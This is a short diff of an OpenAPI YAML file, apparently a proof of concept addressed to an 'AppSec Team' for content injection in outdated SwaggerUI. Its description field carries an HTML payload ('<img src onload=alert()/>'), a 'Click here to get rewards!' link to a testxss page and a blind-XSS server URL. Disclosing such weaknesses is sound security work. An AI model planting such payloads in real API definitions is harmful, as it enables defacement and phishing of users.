@@ -2,7 +2,7 @@ openapi: 3.0.0
 info:
   title: Your system has been HACKED!
   description: Never trust anyone ![down](https://upload.wikimedia.org/wikipedia/commons/b/bb/Anonymous.jpg). [Click here to get rewards!](https://paktiko1986.github.io/testxss/) or HTML.<img src onload=alert()/>
-  version: Hei, NASA. You should upgrade to higher version of SwaggerUI.
+  version: Hei, AppSec Team. You should upgrade to higher version of SwaggerUI and protect with CSP [connect-src 'self'] to prevent from rendring/loading API definition via YAML file.
 
 servers:
   - url: https://paktiko.bxss.in#
